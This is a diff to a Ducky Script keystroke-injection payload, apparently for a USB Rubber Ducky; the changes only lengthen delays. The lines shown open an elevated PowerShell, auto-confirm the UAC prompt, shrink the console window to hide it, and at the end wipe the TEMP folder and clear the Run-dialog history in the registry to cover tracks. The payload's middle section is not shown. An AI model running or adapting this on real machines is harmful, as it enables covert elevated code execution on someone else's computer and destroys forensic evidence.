@@ -7,12 +7,13 @@ REM Props: Darren Kitchen, and I am Jakoby
 REM Version: 2.0
 REM Category: Execution
 
+
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell -Command "Start-Process PowerShell -Verb RunAs"  
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 1000
 ALT y
 DELAY 1000
 STRING PowerShell.exe -noe -c ". mode.com con: lines=5 cols=12"
@@ -72,11 +73,11 @@ DELAY 1000
 ENTER
 DELAY 1000
 STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 1000
 STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-DELAY 500
+DELAY 1000
 ENTER
 DELAY 200
 STRING exit
